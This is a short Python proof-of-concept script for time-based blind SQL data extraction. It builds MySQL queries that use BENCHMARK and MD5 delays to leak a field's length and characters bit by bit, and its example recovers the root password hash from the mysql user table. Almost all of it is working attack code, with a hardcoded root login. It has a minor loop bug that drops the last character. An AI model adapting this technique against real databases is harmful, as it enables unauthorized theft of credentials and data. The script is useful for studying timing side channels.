#!/usr/bin/env python
#
# SQL Blind data extraction POC
# Author Dario Clavijo 2015

import time,sys,os
import MySQLdb

db = MySQLdb.connect(host="localhost",user="root", passwd="password", db="mysql") # name of the data base
cur = db.cursor() 

#make iters longer for reliability, smaller for speed
iters = 500000
sensitivity = 100

bits8 = [128,64,32,16,8,4,2,1]

def measure(sql):
	s_time = time.time();
	cur.execute(sql)
	e_time = time.time();
	d_time = e_time - s_time
	return d_time

def getlength(field,table,where):
	accum = 0
	mintime = measure("select curdate()")
	
	for bitpos in bits8:
		sql = "select if(length({0!s}) & {1:d},benchmark({2:d},md5('cc')),0) from {3!s} where {4!s};".format(field, bitpos, iters, table, where)
		_time = measure(sql)

		bit = int((_time/mintime) > sensitivity)
		if bit == 1:
			accum += bitpos
		print "time:",_time,",bit:",bit
	return accum

def getbits(pos,field,table,where):
	accum = 0
	mintime = measure("select curdate()")
	
	for bitpos in bits8:
		sql = "select if(ord(substring({0!s},{1:d},1)) & {2:d},benchmark({3:d},md5('cc')),0) from {4!s} where {5!s};".format(field, pos, bitpos, iters, table, where) 
		_time = measure(sql)
		
		bit = int((_time/mintime) > sensitivity)
		if bit == 1:
			accum += bitpos
		print "time:",_time,",bit:",bit
	return accum

def getdata(field,table,where):
	tmp = ""
	length = getlength(field,table,where)
	print "length: ",length
	for i in range(1,length):
		c = chr(getbits(i,field,table,where))
		print "CHAR: '{0!s}'".format(c)
		tmp += c
	return tmp

# example against mysql users table
data = getdata('password','user',"user='root' limit 1")
print "RECOVERED DATA:", data
